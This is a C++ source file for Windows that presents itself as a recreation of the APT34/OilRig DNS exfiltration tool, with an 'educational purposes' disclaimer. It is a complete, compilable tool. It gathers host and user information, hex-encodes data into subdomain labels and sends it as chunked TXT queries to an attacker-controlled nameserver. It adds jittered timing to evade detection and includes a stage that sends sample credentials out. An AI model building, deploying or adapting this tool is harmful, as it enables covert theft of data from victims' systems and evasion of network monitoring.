// Helix Kitten (APT34/OilRig) - DNS Exfiltration Tool
// Exfiltrates data via DNS queries to attacker-controlled nameserver
// MITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol)

// For educational and research purposes only
// Author: Nour A
// Reference: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/

// compile: x86_64-w64-mingw32-g++ -o dns_exfil.exe dns_exfil.cpp -lws2_32 -static

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_DNS_PACKET 512
#define MAX_LABEL_LEN 63
#define MAX_DOMAIN_LEN 253
#define DNS_PORT 53

// DNS header structure (RFC 1035)
#pragma pack(push, 1)
typedef struct {
    unsigned short id;
    unsigned short flags;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
} DNS_HEADER;

typedef struct {
    unsigned short qtype;
    unsigned short qclass;
} DNS_QUESTION;
#pragma pack(pop)


// hex encoding table
static const char hex_table[] = "0123456789abcdef";

void hex_encode(const unsigned char* data, size_t len,
                char* output, size_t outLen) {
    size_t j = 0;
    for (size_t i = 0; i < len && j + 2 < outLen; i++) {
        output[j++] = hex_table[(data[i] >> 4) & 0x0F];
        output[j++] = hex_table[data[i] & 0x0F];
    }
    output[j] = '\0';
}


int build_dns_name(char* buffer, const char* name) {
    /**
     * Encode a domain name into DNS wire format.
     * "data.0.exfil.example.com" -> \x04data\x01 0\x05exfil\x07example\x03com\x00
     */
    int pos = 0;
    const char* start = name;

    while (*start) {
        const char* dot = strchr(start, '.');
        int label_len;

        if (dot) {
            label_len = (int)(dot - start);
        } else {
            label_len = (int)strlen(start);
        }

        if (label_len > MAX_LABEL_LEN || label_len == 0) break;

        buffer[pos++] = (char)label_len;
        memcpy(buffer + pos, start, label_len);
        pos += label_len;

        if (dot) {
            start = dot + 1;
        } else {
            break;
        }
    }

    buffer[pos++] = 0; // root label
    return pos;
}


int build_dns_query(char* buffer, const char* name, unsigned short qtype) {
    /**
     * Build a complete DNS query packet.
     */
    DNS_HEADER* header = (DNS_HEADER*)buffer;

    // random transaction ID
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    header->id = htons((unsigned short)(rand() & 0xFFFF));
    header->flags = htons(0x0100);  // standard query, recursion desired
    header->qdcount = htons(1);
    header->ancount = 0;
    header->nscount = 0;
    header->arcount = 0;

    int offset = sizeof(DNS_HEADER);

    // encode question name
    offset += build_dns_name(buffer + offset, name);

    // question type and class
    DNS_QUESTION* question = (DNS_QUESTION*)(buffer + offset);
    question->qtype = htons(qtype);
    question->qclass = htons(1); // IN class
    offset += sizeof(DNS_QUESTION);

    return offset;
}


BOOL send_dns_query(const char* dns_server, const char* query_name,
                    unsigned short qtype) {
    /**
     * Send a DNS query to the specified server.
     */
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return FALSE;

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, dns_server, &server.sin_addr);

    char packet[MAX_DNS_PACKET];
    int packet_len = build_dns_query(packet, query_name, qtype);

    int sent = sendto(sock, packet, packet_len, 0,
                      (struct sockaddr*)&server, sizeof(server));

    if (sent == SOCKET_ERROR) {
        closesocket(sock);
        return FALSE;
    }

    // wait for response (with timeout)
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    char response[MAX_DNS_PACKET];
    int resp_len = recvfrom(sock, response, MAX_DNS_PACKET, 0, NULL, NULL);

    closesocket(sock);
    return (resp_len > 0);
}


int exfiltrate_data(const char* dns_server, const char* domain_suffix,
                    const unsigned char* data, size_t data_len) {
    /**
     * Exfiltrate data via DNS queries.
     * Data is hex-encoded and split across multiple subdomain labels.
     *
     * Format: <hex_data>.<seq>.<session>.<domain_suffix>
     *
     * Each query carries up to 60 hex chars (30 bytes of data).
     */

    // generate session ID
    char session_id[9];
    srand((unsigned int)time(NULL));
    sprintf(session_id, "%08x", rand());

    // hex encode all data
    size_t hex_len = data_len * 2 + 1;
    char* hex_data = (char*)malloc(hex_len);
    if (!hex_data) return -1;

    hex_encode(data, data_len, hex_data, hex_len);

    printf("  [+] Data size: %zu bytes\n", data_len);
    printf("  [+] Hex encoded: %zu chars\n", strlen(hex_data));
    printf("  [+] Session: %s\n", session_id);

    // split into chunks and send
    int chunk_size = 60; // max hex chars per label
    int total_chunks = (int)((strlen(hex_data) + chunk_size - 1) / chunk_size);
    int sent_chunks = 0;

    printf("  [+] Total chunks: %d\n\n", total_chunks);

    for (int seq = 0; seq < total_chunks; seq++) {
        // extract chunk
        char chunk[64];
        int start = seq * chunk_size;
        int len = chunk_size;
        if (start + len > (int)strlen(hex_data)) {
            len = (int)strlen(hex_data) - start;
        }
        strncpy(chunk, hex_data + start, len);
        chunk[len] = '\0';

        // build query name: <chunk>.<seq>.<session>.<suffix>
        char query_name[MAX_DOMAIN_LEN];
        snprintf(query_name, MAX_DOMAIN_LEN, "%s.%d.%s.%s",
                 chunk, seq, session_id, domain_suffix);

        printf("  [DNS] Query %d/%d: %s\n", seq + 1, total_chunks,
               query_name);

        // send as TXT query (more natural for long subdomain queries)
        BOOL result = send_dns_query(dns_server, query_name, 16); // TXT
        if (result) {
            sent_chunks++;
        } else {
            printf("  [!] Query %d failed\n", seq + 1);
        }

        // delay between queries to avoid detection
        Sleep(100 + (rand() % 200)); // 100-300ms jitter
    }

    free(hex_data);
    return sent_chunks;
}


void collect_system_info(char* buffer, size_t bufSize) {
    /**
     * Collect system information for initial beacon.
     */
    char hostname[256] = {0};
    char username[256] = {0};
    DWORD hostnameLen = sizeof(hostname);
    DWORD usernameLen = sizeof(username);

    GetComputerNameA(hostname, &hostnameLen);
    GetUserNameA(username, &usernameLen);

    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);

    snprintf(buffer, bufSize,
        "hostname=%s&user=%s&arch=%s&pid=%lu&os=%lu.%lu",
        hostname, username,
        (si.wProcessorArchitecture == 9) ? "x64" : "x86",
        GetCurrentProcessId(),
        osvi.dwMajorVersion, osvi.dwMinorVersion
    );
}


int main(int argc, char* argv[]) {
    printf("===========================================\n");
    printf("HELIX KITTEN (APT34) - DNS EXFILTRATION\n");
    printf("DNS-Based Data Exfiltration Tool\n");
    printf("===========================================\n\n");
    printf("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY\n\n");

    // initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[!] Winsock initialization failed\n");
        return 1;
    }

    const char* dns_server = "127.0.0.1"; // attacker's DNS server
    const char* exfil_domain = "update.example.com";

    if (argc > 1) dns_server = argv[1];
    if (argc > 2) exfil_domain = argv[2];

    printf("[+] DNS Server: %s\n", dns_server);
    printf("[+] Exfil Domain: *.%s\n", exfil_domain);
    printf("\n");

    // Stage 1: system info beacon
    printf("[STAGE 1] System Info Beacon\n");
    printf("-------------------------------------------\n");
    char sysinfo[1024];
    collect_system_info(sysinfo, sizeof(sysinfo));
    printf("  System info: %s\n\n", sysinfo);

    int result = exfiltrate_data(dns_server, exfil_domain,
                                 (unsigned char*)sysinfo, strlen(sysinfo));
    printf("\n  Chunks sent: %d\n\n", result);

    // Stage 2: file exfiltration demo
    printf("[STAGE 2] File Exfiltration Demo\n");
    printf("-------------------------------------------\n");
    const char* test_data = "username=admin\npassword=P@ssw0rd123\n"
                            "domain=CORP.EXAMPLE.COM\ndc=10.0.0.5";
    printf("  Demo data: %zu bytes\n", strlen(test_data));

    result = exfiltrate_data(dns_server, exfil_domain,
                             (unsigned char*)test_data, strlen(test_data));
    printf("\n  Chunks sent: %d\n", result);

    WSACleanup();

    printf("\n===========================================\n");
    printf("[+] DNS EXFILTRATION COMPLETE\n");
    printf("  Techniques demonstrated:\n");
    printf("  - Raw DNS packet construction (RFC 1035)\n");
    printf("  - Hex-encoded subdomain data embedding\n");
    printf("  - Chunked multi-query exfiltration\n");
    printf("  - Jittered timing to evade detection\n");
    printf("  - TXT query type for larger payloads\n");
    printf("===========================================\n");

    return 0;
}
